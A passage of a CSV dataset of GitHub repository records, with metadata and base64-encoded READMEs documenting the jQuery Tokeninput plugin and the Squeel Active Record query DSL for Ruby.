Y3RpdmVfcmVjb3JkLXJhaWxzNDAuZ2VtZmlsZQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'jquery-tokeninput',248959,"b'Tokeninput is a jQuery plugin which allows your users to select multiple items from a predefined list, using autocompletion as they type to find each item. You may have seen a similar type of text entry when filling in the recipients field sending messages on facebook.'",b'JavaScript',551,2391,,2391,False,b'https://api.github.com/repos/loopj/jquery-tokeninput/forks',"alF1ZXJ5IFRva2VuaW5wdXQ6IEEgVG9rZW5pemluZyBBdXRvY29tcGxldGUg
VGV4dCBFbnRyeQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09CgpPdmVydmlldwotLS0tLS0tLQpUb2tl
bmlucHV0IGlzIGEgalF1ZXJ5IHBsdWdpbiB3aGljaCBhbGxvd3MgeW91ciB1
c2VycyB0byBzZWxlY3QgbXVsdGlwbGUgaXRlbXMgZnJvbSBhIHByZWRlZmlu
ZWQgbGlzdCwgdXNpbmcgYXV0b2NvbXBsZXRpb24gYXMgdGhleSB0eXBlIHRv
IGZpbmQgZWFjaCBpdGVtLiBZb3UgbWF5IGhhdmUgc2VlbiBhIHNpbWlsYXIg
dHlwZSBvZiB0ZXh0IGVudHJ5IHdoZW4gZmlsbGluZyBpbiB0aGUgcmVjaXBp
ZW50cyBmaWVsZCBzZW5kaW5nIG1lc3NhZ2VzIG9uIGZhY2Vib29rLgoKRG9j
dW1lbnRhdGlvbiwgRmVhdHVyZXMgYW5kIERlbW9zCi0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQpGdWxsIGRldGFpbHMgYW5kIGRvY3VtZW50
YXRpb24gY2FuIGJlIGZvdW5kIG9uIHRoZSBwcm9qZWN0IHBhZ2UgaGVyZToK
CjxodHRwOi8vbG9vcGouY29tL2pxdWVyeS10b2tlbmlucHV0Lz4=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'squeel',1591828,"b'Active Record, improved. Live again :)'",b'Ruby',87,2390,,2390,False,b'https://api.github.com/repos/activerecord-hackery/squeel/forks',"IyBTcXVlZWwgWyFbQnVpbGQgU3RhdHVzXShodHRwczovL3NlY3VyZS50cmF2
aXMtY2kub3JnL2FjdGl2ZXJlY29yZC1oYWNrZXJ5L3NxdWVlbC5wbmcpXSho
dHRwOi8vdHJhdmlzLWNpLm9yZy9hY3RpdmVyZWNvcmQtaGFja2VyeS9zcXVl
ZWwpIFshW2VuZG9yc2VdKGh0dHA6Ly9hcGkuY29kZXJ3YWxsLmNvbS9lcm5p
ZS9lbmRvcnNlY291bnQucG5nKV0oaHR0cDovL2NvZGVyd2FsbC5jb20vZXJu
aWUpCgpTcXVlZWwgbGV0cyB5b3Ugd3JpdGUgeW91ciBBY3RpdmUgUmVjb3Jk
IHF1ZXJpZXMgd2l0aCBmZXdlciBzdHJpbmdzLCBhbmQgbW9yZSBSdWJ5LApi
eSBtYWtpbmcgdGhlIEFyZWwgYXdlc29tZW5lc3MgdGhhdCBsaWVzIGJlbmVh
dGggQWN0aXZlIFJlY29yZCBtb3JlIGFjY2Vzc2libGUuCgpTcXVlZWwgbGV0
cyB5b3UgcmV3cml0ZS4uLgoKYGBgcnVieQpBcnRpY2xlLndoZXJlIFsnY3Jl
YXRlZF9hdCA+PSA/JywgMi53ZWVrcy5hZ29dCmBgYAoKLi4uYXMuLi4KCmBg
YHJ1YnkKQXJ0aWNsZS53aGVyZXtjcmVhdGVkX2F0ID49IDIud2Vla3MuYWdv
fQpgYGAKClRoaXMgaXMgYSBfZ29vZCB0aGluZ18uIElmIHlvdSBkb24ndCBh
Z3JlZSwgU3F1ZWVsIG1pZ2h0IG5vdCBiZSBmb3IgeW91LiBUaGUgYWJvdmUg
aXMKanVzdCBhIHNpbXBsZSBleGFtcGxlIC0tIFNxdWVlbCdzIGNhcGFibGUg
b2YgYSB3aG9sZSBsb3QgbW9yZS4gS2VlcCByZWFkaW5nLgoKIyMgR2V0dGlu
ZyBzdGFydGVkCgpJbiB5b3VyIEdlbWZpbGU6CgpgYGBydWJ5CmdlbSAic3F1
ZWVsIiAgIyBMYXN0IG9mZmljaWFsbHkgcmVsZWFzZWQgZ2VtCiMgZ2VtICJz
cXVlZWwiLCA6Z2l0ID0+ICJnaXQ6Ly9naXRodWIuY29tL2FjdGl2ZXJlY29y
ZC1oYWNrZXJ5L3NxdWVlbC5naXQiICMgVHJhY2sgZ2l0IHJlcG8KYGBgCgpU
aGVuIGJ1bmRsZSBhcyB1c3VhbC4KCklmIHlvdSdkIGxpa2UgdG8gY3VzdG9t
aXplIFNxdWVlbCdzIGZ1bmN0aW9uYWxpdHkgYnkgZW5hYmxpbmcgY29yZQpl
eHRlbnNpb25zIGZvciBoYXNoZXMgb3Igc3ltYm9scywgb3IgYWxpYXNpbmcg
c29tZSBwcmVkaWNhdGVzLCB5b3UgY2FuCmNyZWF0ZSBhIHNhbXBsZSBpbml0
aWFsaXplciB3aXRoOgoKYGBgc2gKJCByYWlscyBnIHNxdWVlbDppbml0aWFs
aXplcgpgYGAKCiMjIFRoZSBTcXVlZWwgUXVlcnkgRFNMCgpTcXVlZWwgZW5o
YW5jZXMgdGhlIG5vcm1hbCBBY3RpdmUgUmVjb3JkIHF1ZXJ5IG1ldGhvZHMg
YnkgZW5hYmxpbmcgdGhlbSB0byBhY2NlcHQKYmxvY2tzLiBJbnNpZGUgYSBi
bG9jaywgdGhlIFNxdWVlbCBxdWVyeSBEU0wgY2FuIGJlIHVzZWQuIE5vdGUg
dGhlIHVzZSBvZiBjdXJseSBicmFjZXMKaW4gdGhlc2UgZXhhbXBsZXMgaW5z
dGVhZCBvZiBwYXJlbnRoZXNlcy4gYHt9YCBkZW5vdGVzIGEgU3F1ZWVsIERT
TCBxdWVyeS4KClN0dWJzIGFuZCBrZXlwYXRocyBhcmUgdGhlIHR3byBwcmlt
YXJ5IGJ1aWxkaW5nIGJsb2NrcyB1c2VkIGluIGEgU3F1ZWVsIERTTCBxdWVy
eSwgc28gd2UnbGwKc3RhcnQgYnkgdGFraW5nIGEgbG9vayBhdCB0aGVtLiBN
b3N0IG9mIHRoZSBvdGhlciBleGFtcGxlcyB0aGF0IGZvbGxvdyB3aWxsIGJl
IGJhc2VkIG9uCnRoaXMgInN5bWJvbC1sZXNzIiBibG9jayBzeW50YXguCgoq
KkFuIGltcG9ydGFudCBnb3RjaGEsIGJlZm9yZSB3ZSBiZWdpbjoqKiBUaGUg
U3F1ZWVsIERTTCB3b3JrcyBpdHMgbWFnaWMgdXNpbmcgYGluc3RhbmNlX2V2
YWxgLgpJZiB5b3UndmUgYmVlbiB3b3JraW5nIHdpdGggUnVieSBmb3IgYSB3
aGlsZSwgeW91J2xsIGtub3cgaW1tZWRpYXRlbHkgdGhhdCB0aGlzIG1lYW5z
IHRoYXQKX2luc2lkZV8gYSBTcXVlZWwgRFNMIGJsb2NrLCBgc2VsZmAgaXNu
J3QgdGhlIHNhbWUgdGhpbmcgdGhhdCBpdCBpcyBfb3V0c2lkZV8gdGhlIGJs
b2NrLgoKVGhpcyBjYXJyaWVzIHdpdGggaXQgYW4gaW1wb3J0YW50IGltcGxp
Y2F0aW9uOiA8c3Ryb25nPkluc3RhbmNlIHZhcmlhYmxlcyBhbmQgaW5zdGFu
Y2UgbWV0aG9kcwppbnNpZGUgdGhlIGJsb2NrIHdvbid0IHJlZmVyIHRvIHlv
dXIgb2JqZWN0J3MgdmFyaWFibGVzL21ldGhvZHMuPC9zdHJvbmc+CgpEb24n
dCB3b3JyeSwgU3F1ZWVsJ3MgZ290IHlvdSBjb3ZlcmVkLiBVc2Ugb25lIG9m
IHRoZSBmb2xsb3dpbmcgbWV0aG9kcyB0byBnZXQgYWNjZXNzCnRvIHlvdXIg
b2JqZWN0J3MgbWV0aG9kcyBhbmQgdmFyaWFibGVzOgoKICAxLiBBc3NpZ24g
dGhlIHZhcmlhYmxlIGxvY2FsbHkgYmVmb3JlIHRoZSBEU0wgYmxvY2ssIGFu
ZCBhY2Nlc3MgaXQgYXMgeW91IHdvdWxkCiAgICAgbm9ybWFsbHkuCiAgMi4g
U3VwcGx5IGFuIGFyaXR5IHRvIHRoZSBEU0wgYmxvY2ssIGFzIGluIGBQZXJz
b24ud2hlcmV7fHF8IHEubmFtZSA9PSBAbXlfbmFtZX1gCiAgICAgRG93bnNp
ZGU6IFlvdSdsbCBuZWVkIHRvIHByZWZpeCBzdHVicywga2V5cGF0aHMsIGFu
ZCBmdW5jdGlvbnMgKGV4cGxhaW5lZCBiZWxvdykKICAgICB3aXRoIHRoZSBE
U0wgb2JqZWN0LgogIDMuIFdyYXAgdGhlIG1ldGhvZCBvciBpbnN0YW5jZSB2
YXJpYWJsZSBpbnNpZGUgdGhlIGJsb2NrIHdpdGggYG15e31gLgogICAgIGBQ
ZXJzb24ud2hlcmV7bmFtZSA9PSBteXtzb21lX21ldGhvZF90b19yZXR1cm5f
YV9uYW1lfX1gCgojIyMgU3R1YnMKClN0dWJzIGFyZSwgZm9yIG1vc3QgaW50
ZW50cyBhbmQgcHVycG9zZXMsIGp1c3QgbGlrZSBTeW1ib2xzIGluIGEgbm9y
bWFsIGNhbGwgdG8KYFJlbGF0aW9uI3doZXJlYCAobm90ZSB0aGUgbmVlZCBm
b3IgZG91YmxpbmcgdXAgb24gdGhlIGN1cmx5IGJyYWNlcyBoZXJlLCB0aGUg
Zmlyc3Qgb25lcwpzdGFydCB0aGUgYmxvY2ssIHRoZSBzZWNvbmQgYXJlIHRo
ZSBoYXNoIGJyYWNlcyk6CgpgYGBydWJ5ClBlcnNvbi53aGVyZXt7bmFtZSA9
PiAnRXJuaWUnfX0KIyA9PiBTRUxFQ1QgInBlb3BsZSIuKiBGUk9NICJwZW9w
bGUiICBXSEVSRSAicGVvcGxlIi4ibmFtZSIgPSAnRXJuaWUnCmBgYAoKWW91
IG5vcm1hbGx5IHdvdWxkbid0IGJvdGhlciB1c2luZyB0aGUgRFNMIGluIHRo
aXMgY2FzZSwgYXMgYSBzaW1wbGUgaGFzaCB3b3VsZApzdWZmaWNlLiBIb3dl
dmVyLCBzdHVicyBzZXJ2ZSBhcyBhIGJ1aWxkaW5nIGJsb2NrIGZvciBrZXlw
YXRocywgYW5kIGtleXBhdGhzIGFyZQp2ZXJ5IGhhbmR5LgoKIyMjIEtleVBh
dGhzCgpBIFNxdWVlbCBrZXlwYXRoIGlzIGVzc2VudGlhbGx5IGEgbW9yZSBj
b25jaXNlIGFuZCByZWFkYWJsZSBhbHRlcm5hdGl2ZSB0byBhCmRlZXBseSBu
ZXN0ZWQgaGFzaC4gRm9yIGluc3RhbmNlLCBpbiBzdGFuZGFyZCBBY3RpdmUg
UmVjb3JkLCB5b3UgbWlnaHQgam9pbiBzZXZlcmFsCmFzc29jaWF0aW9ucyBs
aWtlIHRoaXMgdG8gcGVyZm9ybSBhIHF1ZXJ5OgoKYGBgcnVieQpQZXJzb24u
am9pbnMoOmFydGljbGVzID0+IHs6Y29tbWVudHMgPT4gOnBlcnNvbn0pCiMg
PT4gU0VMRUNUICJwZW9wbGUiLiogRlJPTSAicGVvcGxlIgojICAgIElOTkVS
IEpPSU4gImFydGljbGVzIiBPTiAiYXJ0aWNsZXMiLiJwZXJzb25faWQiID0g
InBlb3BsZSIuImlkIgojICAgIElOTkVSIEpPSU4gImNvbW1lbnRzIiBPTiAi
Y29tbWVudHMiLiJhcnRpY2xlX2lkIiA9ICJhcnRpY2xlcyIuImlkIgojICAg
IElOTkVSIEpPSU4gInBlb3BsZSIgInBlb3BsZV9jb21tZW50cyIgT04gInBl
b3BsZV9jb21tZW50cyIuImlkIiA9ICJjb21tZW50cyIuInBlcnNvbl9pZCIK
YGBgCgpXaXRoIGEga2V5cGF0aCwgdGhpcyB3b3VsZCBsb29rIGxpa2U6Cgpg
YGBydWJ5ClBlcnNvbi5qb2luc3thcnRpY2xlcy5jb21tZW50cy5wZXJzb259
CmBgYAoKQSBrZXlwYXRoIGNhbiBleGlzdCBpbiB0aGUgY29udGV4dCBvZiBh
IGhhc2gsIGFuZCBpcyBub3JtYWxseSBpbnRlcnByZXRlZCByZWxhdGl2ZSB0
bwp0aGUgY3VycmVudCBsZXZlbCBvZiBuZXN0aW5nLiBJdCBjYW4gYmUgZm9y
Y2VkIGludG8gYW4gImFic29sdXRlIiBwYXRoIGJ5IGFuY2hvcmluZyBpdCB3
aXRoCmEgfiwgbGlrZToKCmBgYHJ1YnkKfmFydGljbGVzLmNvbW1lbnRzLnBl
cnNvbgpgYGAKClRoaXMgaXNuJ3QgcXVpdGUgc28gdXNlZnVsIGluIHRoZSB0
eXBpY2FsIGhhc2ggY29udGV4dCwgYnV0IGNhbiBiZSB2ZXJ5IHVzZWZ1bCB3
aGVuIGl0IGNvbWVzCnRvIGludGVycHJldGluZyBmdW5jdGlvbnMgYW5kIHRo
ZSBsaWtlLiBXZSdsbCBjb3ZlciB0aG9zZSBsYXRlci4KCiMjIyBQcmVkaWNh
dGVzCgpBbGwgb2YgdGhlIEFyZWwgInByZWRpY2F0aW9uIiBtZXRob2RzIGNh
biBiZSBhY2Nlc3NlZCBpbnNpZGUgdGhlIFNxdWVlbCBEU0wsIHZpYQp0aGVp
ciBtZXRob2QgbmFtZSwgYW4gYWxpYXMsIG9yIGFuIGFuIG9wZXJhdG9yLCB0
byBjcmVhdGUgQXJlbCBwcmVkaWNhdGVzLCB3aGljaCBhcmUKdXNlZCBpbiBg
V0hFUkVgIG9yIGBIQVZJTkdgIGNsYXVzZXMuCgo8dGFibGU+CiAgPHRyPgog
ICAgPHRoPlNRTDwvdGg+CiAgICA8dGg+UHJlZGljYXRpb248L3RoPgogICAg
PHRoPk9wZXJhdG9yPC90aD4KICAgIDx0aD5BbGlhczwvdGg+CiAgPC90cj4K
ICA8dHI+CiAgICA8dGQ+PTwvdGQ+CiAgICA8dGQ+ZXE8L3RkPgogICAgPHRk
Pj09PC90ZD4KICAgIDx0ZD48L3RkPgogIDwvdHI+CiAgPHRyPgogICAgPHRk
PiE9PC90ZD4KICAgIDx0ZD5ub3RfZXE8L3RkPgogICAgPHRkPiE9ICgxLjkg
b25seSksIF4gKDEuOCk8L3RkPgogICAgPHRkPjwvdGQ+CiAgPC90cj4KICA8
dHI+CiAgICA8dGQ+TElLRTwvdGQ+CiAgICA8dGQ+bWF0Y2hlczwvdGQ+CiAg
ICA8dGQ+PX48L3RkPgogICAgPHRkPmxpa2U8L3RkPgogIDwvdHI+CiAgPHRy
PgogICAgPHRkPk5PVCBMSUtFPC90ZD4KICAgIDx0ZD5kb2VzX25vdF9tYXRj
aDwvdGQ+CiAgICA8dGQ+IX4gKDEuOSBvbmx5KTwvdGQ+CiAgICA8dGQ+bm90
X2xpa2U8L3RkPgogIDwvdHI+CiAgPHRyPgogICAgPHRkPiZsdDs8L3RkPgog
ICAgPHRkPmx0PC90ZD4KICAgIDx0ZD4mbHQ7PC90ZD4KICAgIDx0ZD48L3Rk
PgogIDwvdHI+CiAgPHRyPgogICAgPHRkPiZsdDs9PC90ZD4KICAgIDx0ZD5s
dGVxPC90ZD4KICAgIDx0ZD4mbHQ7PTwvdGQ+CiAgICA8dGQ+bHRlPC90ZD4K
ICA8L3RyPgogIDx0cj4KICAgIDx0ZD4+PC90ZD4KICAgIDx0ZD5ndDwvdGQ+
CiAgICA8dGQ+PjwvdGQ+CiAgICA8dGQ+PC90ZD4KICA8L3RyPgogIDx0cj4K
ICAgIDx0ZD4+PTwvdGQ+CiAgICA8dGQ+Z3RlcTwvdGQ+CiAgICA8dGQ+Pj08
L3RkPgogICAgPHRkPmd0ZTwvdGQ+CiAgPC90cj4KICA8dHI+CiAgICA8dGQ+
SU48L3RkPgogICAgPHRkPmluPC90ZD4KICAgIDx0ZD4+PjwvdGQ+CiAgICA8
dGQ+PC90ZD4KICA8L3RyPgogIDx0cj4KICAgIDx0ZD5OT1QgSU48L3RkPgog
ICAgPHRkPm5vdF9pbjwvdGQ+CiAgICA8dGQ+Jmx0OyZsdDs8L3RkPgogICAg
PHRkPjwvdGQ+CiAgPC90cj4KPC90YWJsZT4KCkxldCdzIHNheSB3ZSB3YW50
IHRvIGdlbmVyYXRlIHRoaXMgc2ltcGxlIHF1ZXJ5OgoKYGBgClNFTEVDVCAi
cGVvcGxlIi4qIEZST00gcGVvcGxlIFdIRVJFICJwZW9wbGUiLiJuYW1lIiA9
ICdKb2UgQmxvdycKYGBgCgpBbGwgb2YgdGhlIGZvbGxvd2luZyB3aWxsIGdl
bmVyYXRlIHRoZSBhYm92ZSBTUUw6CgpgYGBydWJ5ClBlcnNvbi53aGVyZSg6
bmFtZSA9PiAnSm9lIEJsb3cnKQpQZXJzb24ud2hlcmV7e25hbWUgPT4gJ0pv
ZSBCbG93J319ClBlcnNvbi53aGVyZXt7bmFtZS5lcSA9PiAnSm9lIEJsb3cn
fX0KUGVyc29uLndoZXJle25hbWUuZXEgJ0pvZSBCbG93J30KUGVyc29uLndo
ZXJle25hbWUgPT0gJ0pvZSBCbG93J30KYGBgCgpOb3QgYSB2ZXJ5IGV4Y2l0
aW5nIGV4YW1wbGUgc2luY2UgZXF1YWxpdHkgaXMgaGFuZGxlZCBqdXN0IGZp
bmUgdmlhIHRoZQpmaXJzdCBleGFtcGxlIGluIHN0YW5kYXJkIEFjdGl2ZSBS
ZWNvcmQuIEJ1dCBjb25zaWRlciB0aGUgZm9sbG93aW5nIHF1ZXJ5OgoKYGBg
c3FsClNFTEVDVCAicGVvcGxlIi4qIEZST00gcGVvcGxlCldIRVJFICgicGVv
cGxlIi4ibmFtZSIgTElLRSAnRXJuaWUlJyBBTkQgInBlb3BsZSIuInNhbGFy
eSIgPCA1MDAwMCkKICBPUiAgKCJwZW9wbGUiLiJuYW1lIiBMSUtFICdKb2Ul
JyBBTkQgInBlb3BsZSIuInNhbGFyeSIgPiAxMDAwMDApCmBgYAoKVG8gZG8g
dGhpcyB3aXRoIHN0YW5kYXJkIEFjdGl2ZSBSZWNvcmQsIHdlJ2QgZG8gc29t
ZXRoaW5nIGxpa2U6CgpgYGBydWJ5ClBlcnNvbi53aGVyZSgKICAnKG5hbWUg
TElLRSA/IEFORCBzYWxhcnkgPCA/KSBPUiAobmFtZSBMSUtFID8gQU5EIHNh
bGFyeSA+ID8pJywKICAnRXJuaWUlJywgNTAwMDAsICdKb2UlJywgMTAwMDAw
CikKYGBgCgpXaXRoIFNxdWVlbDoKCmBgYHJ1YnkKUGVyc29uLndoZXJleyhu
YW1lID1+ICdFcm5pZSUnKSAmIChzYWxhcnkgPCA1MDAwMCkgfCAobmFtZSA9
fiAnSm9lJScpICYgKHNhbGFyeSA+IDEwMDAwMCl9CmBgYAoKSGVyZSwgd2Un
cmUgdXNpbmcgYCZgIGFuZCBgfGAgdG8gZ2VuZXJhdGUgYEFORGAgYW5kIGBP
UmAsIHJlc3BlY3RpdmVseS4KClRoZXJlIGFyZSB0d28gb2J2aW91cyBidXQg
aW1wb3J0YW50IGRpZmZlcmVuY2VzIGJldHdlZW4gdGhlc2UgdHdvIGNvZGUg
c2FtcGxlcywgYW5kCmJvdGggb2YgdGhlbSBoYXZlIHRvIGRvIHdpdGggKmNv
bnRleHQqLgoKMS4gVG8gcmVhZCBjb2RlIHdpdGggU1FMIGludGVycG9sYXRp
b24sIHRoZSBzdHJ1Y3R1cmUgb2YgdGhlIFNRTCBxdWVyeSBtdXN0CiAgIGZp
cnN0IGJlIGNvbnNpZGVyZWQsIHRoZW4gd2UgbXVzdCBjcm9zcy1yZWZlcmVu
Y2UgdGhlIHZhbHVlcyB0byBiZSBzdWJzdGl0dXRlZAogICB3aXRoIHRoZWly
IHBsYWNlaG9sZGVycy4gVGhpcyBjYXJyaWVzIHdpdGggaXQgYSBzbWFsbCBi
dXQgcGVyY2VwdGlibGUgKGFuZAogICBhbm5veWluZyEpIGNvbnRleHQgc2hp
ZnQgZHVyaW5nIHdoaWNoIHdlIHN0b3AgdGhpbmtpbmcgYWJvdXQgdGhlIGNv
bXBhcmlzb24gYmVpbmcKICAgcGVyZm9ybWVkLCBhbmQgaW5zdGVhZCBwbGF5
ICJjb3VudCB0aGUgYXJndW1lbnRzIiwgb3IsIGluIHRoZSBjYXNlIG9mCiAg
IG5hbWVkL2hhc2ggaW50ZXJwb2xhdGlvbnMsICJmaW5kIHRoZSB3b3JkIi4g
VGhlIFNxdWVlbCBzeW50YXggcGxhY2VzCiAgIGJvdGggc2lkZXMgb2YgZWFj
aCBjb21wYXJpc29uIGluIHByb3hpbWl0eSB0byBvbmUgYW5vdGhlciwgYWxs
b3dpbmcgdXMgdG8KICAgZm9jdXMgb24gd2hhdCBvdXIgY29kZSBpcyBkb2lu
Zy4KCjIuIEluIHRoZSBmaXJzdCBleGFtcGxlLCB3ZSdyZSBzdGFydGluZyBv
ZmYgd2l0aCBSdWJ5LCBzd2l0Y2hpbmcgY29udGV4dCB0byBTUUwsCiAgIGFu
ZCB0aGVuIGJhY2sgdG8gUnVieSwgYW5kIHdoaWxlIHdlIHNwZW5kIHRpbWUg
aW4gU1FMLWxhbmQsIHdlJ3JlIHN0dWNrIHdpdGgKICAgU1FMIHN5bnRheCwg
d2hldGhlciBvciBub3QgaXQncyB0aGUgYmVzdCB3YXkgdG8gZXhwcmVzcyB3
aGF0IHdlJ3JlIHRyeWluZyB0byBkby4KICAgV2l0aCBTcXVlZWwsIHdlJ3Jl
IHdyaXRpbmcgUnVieSBmcm9tIHN0YXJ0IHRvIGZpbmlzaC4gQW5kIHdpdGgg
UnVieSBzeW50YXggY29tZXMKICAgZmxleGliaWxpdHkgdG8gZXhwcmVzcyB0
aGUgcXVlcnkgaW4gdGhlIHdheSB3ZSBzZWUgZml0LgoKIyMjIFByZWRpY2F0
ZSBhbGlhc2VzCgpUaGF0IGxhc3QgYml0IGlzIGltcG9ydGFudC4gV2UgY2Fu
IG1peCBhbmQgbWF0Y2ggcHJlZGljYXRlIG1ldGhvZHMgd2l0aCBvcGVyYXRv
cnMKYW5kIHRha2UgYWR2YW50YWdlIG9mIFJ1YnkncyBvcGVyYXRvciBwcmVj
ZWRlbmNlIG9yIHBhcmVudGhldGljYWwgZ3JvdXBpbmcgdG8gbWFrZQpvdXIg
aW50ZW50aW9ucyBtb3JlIGNsZWFyLCBvbiB0aGUgZmlyc3QgcmVhZC10aHJv
dWdoLiBBbmQgaWYgd2UgZG9uJ3QgbGlrZSB0aGUKd2F5IHRoYXQgdGhlIGV4
aXN0aW5nIHByZWRpY2F0aW9ucyByZWFkLCB3ZSBjYW4gY3JlYXRlIG91ciBv
d24gYWxpYXNlcyBpbiBhIFNxdWVlbApjb25maWd1cmUgYmxvY2s6CgpgYGBy
dWJ5ClNxdWVlbC5jb25maWd1cmUgZG8gfGNvbmZpZ3wKICBjb25maWcuYWxp
YXNfcHJlZGljYXRlIDppc19sZXNzX3RoYW4sIDpsdAplbmQKYGBgCmBgYHJ1
YnkKUGVyc29uLndoZXJle3NhbGFyeS5pc19sZXNzX3RoYW4gNTAwMDB9LnRv
X3NxbAojID0+IFNFTEVDVCAicGVvcGxlIi4qIEZST00gInBlb3BsZSIgIFdI
RVJFICJwZW9wbGUiLiJzYWxhcnkiIDwgNTAwMDAKYGBgCgpBbmQgd2hpbGUg
d2UncmUgb24gdGhlIHRvcGljIG9mIGhlbHBpbmcgeW91IG1ha2UgeW91ciBj
b2RlIG1vcmUgZXhwcmVzc2l2ZS4uLgoKIyMjIENvbXBvdW5kIGNvbmRpdGlv
bnMKCkxldCdzIHNheSB5b3Ugd2FudCB0byBjaGVjayBpZiBhIFBlcnNvbiBo
YXMgYSBuYW1lIGxpa2Ugb25lIG9mIHNldmVyYWwgcG9zc2liaWxpdGllcy4K
CmBgYHJ1YnkKbmFtZXMgPSBbJ0VybmllJScsICdKb2UlJywgJ01hcnklJ10K
UGVyc29uLndoZXJlKCduYW1lIExJS0UgPyBPUiBuYW1lIExJS0UgPyBPUiBu
YW1lIExJS0UgPycsICpuYW1lcykKYGBgCgpCdXQgeW91J3JlIHNtYXJ0LCBh
bmQgeW91IGtub3cgdGhhdCB5b3UgbWlnaHQgd2FudCB0byBjaGVjayBtb3Jl
IG9yIGxlc3MgdGhhbgozIG5hbWVzLCBzbyB5b3UgbWFrZSB5b3VyIHF1ZXJ5
IGZsZXhpYmxlOgoKYGBgcnVieQpQZXJzb24ud2hlcmUoKFsnbmFtZSBMSUtF
ID8nXSAqIG5hbWVzLnNpemUpLmpvaW4oJyBPUiAnKSwgKm5hbWVzKQpgYGAK
ClllYWguLi4gdGhhdCdzIHJlYWRhYmxlLCBhbGwgcmlnaHQuIEhvdyBhYm91
dDoKCmBgYHJ1YnkKUGVyc29uLndoZXJle25hbWUubGlrZV9hbnkgbmFtZXN9
CiMgPT4gU0VMRUNUICJwZW9wbGUiLiogRlJPTSAicGVvcGxlIgojICAgIFdI
RVJFICgoInBlb3BsZSIuIm5hbWUiIExJS0UgJ0VybmllJScgT1IgInBlb3Bs
ZSIuIm5hbWUiIExJS0UgJ0pvZSUnIE9SICJwZW9wbGUiLiJuYW1lIiBMSUtF
ICdNYXJ5JScpKQpgYGAKCkknbSBub3Qgc3VyZSBhYm91dCB5b3UsIGJ1dCBJ
IG11Y2ggcHJlZmVyIHRoZSBsYXR0ZXIuIEluIHNob3J0LCB5b3UgY2FuIGFk
ZCBgX2FueWAgb3IKYF9hbGxgIHRvIGFueSBwcmVkaWNhdGUgbWV0aG9kLCBh
bmQgaXQgd291bGQgZG8gd2hhdCB5b3UgZXhwZWN0LCB3aGVuIGdpdmVuIGFu
IGFycmF5IG9mCnBvc3NpYmlsaXRpZXMgdG8gY29tcGFyZSBhZ2FpbnN0LgoK
IyMjIFNpZnRlcnMKClNpZnRlcnMgYXJlIGxpa2UgbGl0dGxlIHNuaXBwZXRz
IG9mIGNvbmRpdGlvbnMgdGhhdCB0YWtlIHBhcmFtZXRlcnMuIExldCdzIHNh
eSB0aGF0IHlvdQpoYXZlIGEgbW9kZWwgY2FsbGVkIEFydGljbGUsIGFuZCB5
b3Ugb2Z0ZW4gd2FudCB0byBxdWVyeSBmb3IgYXJ0aWNsZXMgdGhhdCBjb250
YWluIGEKc3RyaW5nIGluIHRoZSB0aXRsZSBvciBib2R5LiBTbyB5b3Ugd3Jp
dGUgYSBzY29wZToKCmBgYHJ1YnkKZGVmIHNlbGYudGl0bGVfb3JfYm9keV9j
b250YWlucyhzdHJpbmcpCiAgd2hlcmV7dGl0bGUubWF0Y2hlcygiJSN7c3Ry
aW5nfSUiKSB8IGJvZHkubWF0Y2hlcygiJSN7c3RyaW5nfSUiKX0KZW5kCmBg
YAoKQnV0IHRoZW4geW91IHdhbnQgdG8gcXVlcnkgZm9yIHBlb3BsZSB3aG8g
d3JvdGUgYW4gYXJ0aWNsZSB0aGF0IG1hdGNoZXMgdGhlc2UgY29uZGl0aW9u
cywKYnV0IHRoZSBzY29wZSBvbmx5IHdvcmtzIGFnYWluc3QgdGhlIG1vZGVs
IHdoZXJlIGl0IHdhcyBkZWZpbmVkLiBTbyBpbnN0ZWFkLCB5b3Ugd3JpdGUg
YQpzaWZ0ZXI6CgpgYGBydWJ5CmNsYXNzIEFydGljbGUgPCBBY3RpdmVSZWNv
cmQ6OkJhc2UKICBzaWZ0ZXIgOnRpdGxlX29yX2JvZHlfY29udGFpbnMgZG8g
fHN0cmluZ3wKICAgIHRpdGxlLm1hdGNoZXMoIiUje3N0cmluZ30lIikgfCBi
b2R5Lm1hdGNoZXMoIiUje3N0cmluZ30lIikKICBlbmQKZW5kCmBgYAoKTm93
IHlvdSBjYW4gd3JpdGUuLi4KCmBgYHJ1YnkKQXJ0aWNsZS53aGVyZXtzaWZ0
IDp0aXRsZV9vcl9ib2R5X2NvbnRhaW5zLCAnYXdlc29tZSd9CiMgPT4gU0VM
RUNUICJhcnRpY2xlcyIuKiBGUk9NICJhcnRpY2xlcyIKIyAgICBXSEVSRSAo
KAojICAgICAgImFydGljbGVzIi4idGl0bGUiIExJS0UgJyVhd2Vzb21lJScK
IyAgICAgIE9SICJhcnRpY2xlcyIuImJvZHkiIExJS0UgJyVhd2Vzb21lJScK
IyAgICApKQpgYGAKCi4uLiBvciAuLi4KCmBgYHJ1YnkKUGVyc29uLmpvaW5z
KDphcnRpY2xlcykuCiAgICAgICB3aGVyZXsKICAgICAgICAge2FydGljbGVz
ID0+IHNpZnQoOnRpdGxlX29yX2JvZHlfY29udGFpbnMsICdhd2Vzb21lJyl9
CiAgICAgICB9CiMgPT4gU0VMRUNUICJwZW9wbGUiLiogRlJPTSAicGVvcGxl
IgojICAgIElOTkVSIEpPSU4gImFydGljbGVzIiBPTiAiYXJ0aWNsZXMiLiJw
ZXJzb25faWQiID0gInBlb3BsZSIuImlkIgojICAgIFdIRVJFICgoCiMgICAg
ICAiYXJ0aWNsZXMiLiJ0aXRsZSIgTElLRSAnJWF3ZXNvbWUlJwojICAgICAg
